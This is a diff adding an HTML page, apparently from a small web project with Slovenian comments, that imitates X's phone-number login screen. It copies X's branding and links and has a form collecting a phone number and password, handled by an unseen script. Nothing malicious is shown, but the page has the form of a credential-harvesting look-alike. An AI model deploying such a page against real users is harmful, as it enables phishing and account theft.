@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>X - Log in with phone</title>
+</head>
+<body>
+
+    <div class="obrazec">
+        <div class="leva">
+            <h1>Log in with <br>phone number.</h1>
+            
+            <form class="login-form" id="phoneLoginForm" onsubmit="handlePhonePasswordSubmit(event)">
+                
+                <!-- 1. Korak: Vnos telefonske številke -->
+                <div id="phoneStepContainer">
+                    <div class="phone-title">Enter your phone number</div>
+                    <div class="phone-group phone-group-margin">
+                        <select name="country_code" id="countryCode" class="country-select">
+                            <option value="+386">🇸🇮 +386</option>
+                            <option value="+381">🇷🇸 +381</option>
+                            <option value="+385">🇭🇷 +385</option>
+                            <option value="+39">🇮🇹 +39</option>
+                            <option value="+43">🇦🇹 +43</option>
+                            <option value="+49">🇩🇪 +49</option>
+                            <option value="+1">🇺🇸 +1</option>
+                            <option value="+44">🇬🇧 +44</option>
+                        </select>
+                        <input type="tel" name="phone" id="phoneInput" class="vnos phone-input" placeholder="Phone number" required>
+                    </div>
+                    <button type="button" class="oddaja" onclick="checkPhoneStep()">Continue</button>
+                    <a href="index.html" class="oddaja btn-mt btn-back btn-register">Back to Login</a>
+                </div>
+
+                <!-- 2. Korak: Vnos gesla -->
+                <div id="step2Container" class="hidden-step">
+                    <div id="userInfoDisplay" class="user-info-display"></div>
+                    <input type="password" name="password" id="password" class="vnos" placeholder="Password">
+                    
+                    <button type="submit" class="oddaja btn-mt">Log in</button>
+                    
+                    <!-- Gumb za nazaj na vnos telefona -->
+                    <button type="button" class="oddaja btn-back" onclick="goBackToPhoneStep()">Back</button>
+                </div>
+            </form>
+
+            <!-- Obvestilo o uspešni prijavi -->
+            <div id="successMessage" class="success-message">
+                <div class="success-title">
+                    Prijava je uspešna! Dobrodošli nazaj.
+                </div>
+                <button type="button" class="oddaja" onclick="resetToHome()">Domov / Nazaj</button>
+            </div>
+
+            <div class="terms">
+                By continuing, you agree to our <a href="https://x.com/en/tos">Terms of Service</a>, <a href="https://x.com/en/privacy">Privacy Policy</a> and <a href="https://help.x.com/en/rules-and-policies/x-cookies">Cookie Use</a>.
+            </div>
+        </div>
+
+        <!-- QR koda -->
+        <div class="desna">
+            <div class="giant-x"><img src="slike\X_logo.png" alt=""></div>
+            <div class="qr-box">
+                <div class="qr-text">Scan to get the app</div>
+                <div class="qr-visual"><a href="qr.html"><img src="slike/download.svg" alt="QR Code"></a></div>
+            </div>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <a href="https://about.x.com/en" target="_blank">About</a>
+        <a href="https://help.x.com/en/using-x/download-the-x-app" target="_blank">Get App</a>
+        <a href="https://grok.com/" target="_blank">Grok</a>
+        <a href="https://help.x.com/en" target="_blank">Help</a>
+        <a href="https://x.com/en/tos" target="_blank">Terms</a>
+        <a href="https://x.com/en/privacy" target="_blank">Privacy</a>
+        <a href="https://help.x.com/en/rules-and-policies/x-cookies" target="_blank">Cookies</a>
+        <a href="https://x.ai/careers" target="_blank">Creators</a>
+        <a href="https://business.x.com/en/advertising?ref=gl-tw-tw-twitter-advertise" target="_blank">Ads & Business</a>
+        <a href="https://developer.x.com/" target="_blank">Developers</a>
+        <a href="https://x.com/i/jf/stories/home" target="_blank">News</a>
+        <a href="https://help.x.com/en/resources/accessibility" target="_blank">Accessibility</a>
+        <a href="">© 2026 X Corp.</a>
+    </footer>
+
+    <!-- Logika za telefonsko prijavo -->
+    <script src="phone.js"></script>
+</body>
+</html>
